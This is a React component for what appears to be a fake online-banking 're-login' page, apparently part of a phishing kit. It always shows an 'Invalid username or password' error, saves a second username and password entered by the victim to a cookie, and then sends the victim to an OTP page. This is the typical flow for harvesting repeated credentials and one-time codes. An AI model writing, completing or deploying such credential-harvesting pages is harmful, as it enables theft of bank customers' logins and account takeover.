import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import Navbar from "../components/navbar/navbar";
import cookies from "../utils/cookie.config";


export default function ReLogin() {
    const [formInput, setFormInput] = useState<Login2>({
        username2: "",
        password2: ""
    })

    

    function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
        setFormInput((prevData) => ({
            ...prevData,
            [event.target.name]: event.target.value
        }))
    }
    const navigate = useNavigate()
    function handleSubmit(event: React.FormEvent<HTMLFormElement>){
        
        event.preventDefault()
        cookies.set("login2", formInput)
        navigate("../otp", {replace:true})
    }

  return (
    <div>
      <Navbar />
      <div className="main-body">
        <div className="form">
        <form onSubmit={handleSubmit}>
            <p style={{fontWeight:"bold", padding:"10px"}}>User Login</p>
            <hr />
    
    <div style={{textAlign:"center", color:"red"}}>
        <p>Invalid username or password. Try Again!</p>
    </div>
            <div style={{padding:"20px"}}>
            <div className="form-item">
              <label htmlFor="">Username</label>
              <input type="text" name="username2" required onChange={handleInputChange} />
            </div>

            <div className="form-item">
              <label htmlFor="">Password</label>
              <input type="password" name="password2" required onChange={handleInputChange} />
            </div>

            <div className="remeber-me">
                <input type="checkbox" />
                <label htmlFor="">Remember Me</label>
            </div>

            <div className="btn">
              <button>Log In</button>
            </div>
            </div>
          </form>
<br />
          <div style={{textAlign:"center", color:"#3379E4"}}>
            <p>Can't Sign in</p>
            <br />
            <p>Enroll in Online banking</p>
          </div>
        </div>
      </div>
    </div>
  );
}
